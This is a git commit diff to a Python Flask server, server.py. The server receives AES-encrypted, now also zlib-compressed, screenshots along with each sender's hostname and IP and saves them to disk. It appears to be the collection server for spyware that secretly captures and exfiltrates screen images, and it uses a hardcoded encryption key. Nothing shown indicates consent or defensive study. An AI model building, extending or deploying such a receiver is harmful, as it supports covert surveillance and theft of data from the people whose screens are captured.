332f58a4c0fb3f0a8829c35db5b8ff6883bfab30
Trần Dũng <89596236+DungTran99@users.noreply.github.com>
2025-06-03 23:01:58 +0700

    Update server.py

--- server.py
+++ server.py
@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 from Crypto.Cipher import AES
 import base64, os
 from datetime import datetime
+import zlib
 
 app = Flask(__name__)
 SECRET_KEY = b'ThisIsASecretKey'
@@ -24,18 +25,22 @@ def upload():
     try:
         content = request.get_json()
         info = content["system_info"]
-        img_data = decrypt_aes(content["screenshot"], SECRET_KEY)
+        img_data_encrypted = content["screenshot"]
+
+        # Giải mã AES
+        decrypted_data = decrypt_aes(img_data_encrypted, SECRET_KEY)
+
+        # Giải nén zlib
+        img_data = zlib.decompress(decrypted_data)
 
         filename = f"{info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-        path = os.path.join(SAVE_FOLDER, filename)
-        with open(path, "wb") as f:
+        with open(os.path.join(SAVE_FOLDER, filename), "wb") as f:
             f.write(img_data)
 
-        print(f"[+] Received image from {info['ip']} - saved as {filename}")
+        print(f"[+] Received and decompressed image from {info['ip']} - {filename}")
         return jsonify({"status": "ok"})
     except Exception as e:
         print(f"[-] Error: {e}")
         return jsonify({"status": "fail", "error": str(e)}), 400
-
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
